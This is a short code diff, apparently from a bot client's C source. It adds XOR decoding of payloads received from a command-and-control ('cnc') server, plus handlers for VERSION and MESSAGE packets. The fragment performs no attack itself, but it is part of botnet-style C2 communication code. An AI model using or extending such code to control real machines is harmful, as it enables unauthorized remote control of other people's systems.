@@ -135,6 +135,10 @@ int main(int argc, char *argv[])
 			
 			memcpy(&pkt, pktbuf, buflen);
 			
+			util_strxor(pkt.msg.payload, pkt.msg.payload, pkt.msg.length);
+			
+			printf("payload1: %s\r\n", pkt.msg.payload);
+			
 #ifdef DEBUG
 			// Packet received
 			util_msgc("Info", "We've received a %s!", util_type2str(pkt.type));
@@ -148,13 +152,20 @@ int main(int argc, char *argv[])
 					net_fdsend(sockfd, PONG, "");
 				break;
 				
-				case ERROR:
+				case VERSION:
 #ifdef DEBUG
-					util_msgc("Info", "Error from cnc!");
+					util_msgc("Info", "Version from cnc!");
 #endif
-					net_fdsend(sockfd, ERROR, "ACK");
+					net_fdsend(sockfd, VERSION, VERSIONSTR);
 				break;
-			}
+				
+				case MESSAGE:
+#ifdef DEBUG
+					util_msgc("Info", "Message from cnc!");
+					util_msgc("Message", "Payload: %s", pkt.msg.payload);
+#endif
+				break;
+			} // Switch
 		} // While
 		sleep(1);
 	} // While
